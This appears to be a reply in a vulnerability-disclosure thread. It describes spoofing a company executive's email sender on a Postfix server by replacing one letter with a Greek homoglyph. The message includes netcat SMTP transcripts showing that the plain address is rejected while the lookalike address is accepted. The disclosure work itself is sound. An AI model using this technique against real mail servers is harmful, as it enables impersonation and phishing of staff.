Subject: Re: spoofing of local email sender via a homoglyph
 attack

Hi,

To follow up on your questions:

1) How exactly would a mail server block a message from an existing
username (even without the homoglyph attack for now), and under what
scenario - message being submitted locally or via SMTP?

The current configuration actually blocks any non-authorized requests as 
explained in the description. The use-case of this (from my perspective) 
is that it could be used to advance a social-engineer attack into 
tricking the recipients believing that they are getting an email from a 
high-level position at the company.

It's related to the from header.

Issuing a regular unauthenticated request, trying to send an email from 
john.doe, which is a high-level user at the company:
$ nc -v *** OMITTED *** 25
Connection to *** OMITTED *** 25 port [tcp/smtp] succeeded!
220 *** OMITTED *** ESMTP Postfix
mail from: john.doe@...ver.com
250 2.1.0 Ok
rcpt to: existing.user@...ver.com
553 5.7.1 <john.doe@...ver.com>: Sender address rejected: not logged in

As you can see, the mail server rejects the request as the existing user 
hasn't authenticated himself.


However, issuing a request using a homoglyph character:
$ echo -ne "j\xce\xbfhn.doe@...ver.com" | xclip -selection clipboard
$ nc -v *** OMITTED ***  25
Connection to *** OMITTED ***  25 port [tcp/smtp] succeeded!
220 *** OMITTED ***  ESMTP Postfix
mail from: jÎ¿hn.doe@...ver.com
250 2.1.0 Ok
rcpt to: existing.user@...ver.com
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>

The victim would get an email thinking it's from the actual john.doe 
user.

Whether this is applicable for assigning a CVE it's up to you decide, 
the only actual risk here discovered so far is a social-engineering 
attack.
